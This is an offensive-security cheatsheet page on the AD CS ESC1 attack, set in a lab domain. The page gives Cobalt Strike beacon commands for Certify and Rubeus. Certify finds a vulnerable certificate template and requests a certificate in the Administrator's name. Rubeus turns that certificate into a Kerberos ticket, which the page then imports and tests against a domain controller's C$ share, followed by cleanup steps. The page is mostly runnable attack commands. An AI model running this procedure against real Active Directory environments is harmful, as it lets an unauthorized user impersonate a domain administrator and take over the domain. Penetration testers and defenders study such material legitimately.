---
title: "AD CS ESC1 \u00b7 Requester-Controlled Identity"
description: "Identify an authentication template with requester-controlled subject or SAN, request the lab certificate and verify PKINIT and the resulting account identity."
category: "AD CS"
tools: ["Cobalt Strike", "Certify", "Rubeus", "Kerbeus BOF"]
updated: "2026-11-16"
tags: ["adcs", "esc1"]
draft: false
---

## 1. Why the attack works

ESC1 combines enrollment rights with an authentication-capable template that lets the requester supply identity information. In the notes, `pchilds` requests a certificate containing Administrator's UPN and uses it for PKINIT.

| Requirement | Verify |
|---|---|
| Published template | The selected CA issues `ESC1` |
| Enrollment rights | Current identity can enroll |
| Identity control | `ENROLLEE_SUPPLIES_SUBJECT` and accepted SAN data |
| Authentication usage | For example, Client Authentication |
| Issuance | No unmet manager approval or signature requirement |
| Mapping | Certificate maps to the intended account under the KDC's rules |

## 2. Enumerate and request

```shell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
# Record request ID and complete PFX output.
```

The UPN-only request reproduces the supplied lab. With strong mapping enforced, a certificate can be issued yet fail to authenticate as Administrator if its binding identifies the requester. Review the actual SID extension and mapping rather than treating the ESC1 label as sufficient.

## Authenticate with the certificate

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:<CERTIFICATE_PFX_BASE64> /enctype:aes256 /nowrap
# Retain the returned TGT; this command does not import it.
```

The PFX must contain the private key. Verify certificate trust, validity, authentication usage, revocation availability and account mapping. An issued PFX does not prove that the KDC will accept it as the requested identity.

## Import and verify the TGT

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<TGT_BASE64>
beacon> steal_token <CREATED_PID>
beacon> run klist
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\Administrator FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
beacon> run klist
```

Confirm the ticket client is `Administrator` and its service is `krbtgt/CONTOSO.COM`. Select one import path. Then verify an operation that the represented account is authorized to perform.

```shell
beacon> ls \\lon-dc-1\c$
```

## Session cleanup

```shell
beacon> krb_purge
beacon> rev2self
# Rubeus createnetonly path only:
beacon> kill <CREATED_PID>
```

Purging a ticket cache does not revoke the certificate. Record the issued request IDs and certificate serials for revocation through the CA when required.

## Troubleshooting

| Symptom | Check |
|---|---|
| Certificate issued as the wrong identity | SAN, CA-added SID binding and KDC mapping; enrollment success alone is insufficient |
| PKINIT fails | PFX includes its private key, PFX password if set, DC certificate/PKINIT support, clock and account mapping |
| Ticket imports but access is denied | Actual client identity, selected session, SPN and resource permissions |

## Quick checklist

```text
[ ] Verify enrollment, publication, authentication EKU and requester-controlled identity.
[ ] Check approval/signature requirements and certificate-to-account mapping.
[ ] Request the ESC1 certificate; record request ID, serial and complete PFX.

AUTHENTICATE AND VERIFY
[ ] Obtain the final PFX with its private key; verify the intended identity.
[ ] Rubeus asktgt /certificate:<PFX_BASE64> -> retain the returned TGT.
# Rubeus Alternative
[ ] createnetonly /ticket:<TGT_BASE64> -> record PID, then steal_token <CREATED_PID>.
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
[ ] make_token CONTOSO\Administrator FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
[ ] run klist -> verify client, realm, service and expiration.
[ ] Test actual resource authorization for this identity.

CLEANUP
[ ] Purge only the disposable session, then rev2self.
[ ] Kill only the process created by the Rubeus alternative.
[ ] Remove exported private-key material when no longer needed; handle certificate revocation separately.
```

## Related references

- [Certificate mapping and enumeration](/cheatsheets/adcs-enumeration-cheatsheet/)
- [AD CS enumeration](/cheatsheets/adcs-enumeration-cheatsheet/)
- [Certify](https://github.com/GhostPack/Certify)
- [Rubeus](https://github.com/GhostPack/Rubeus)
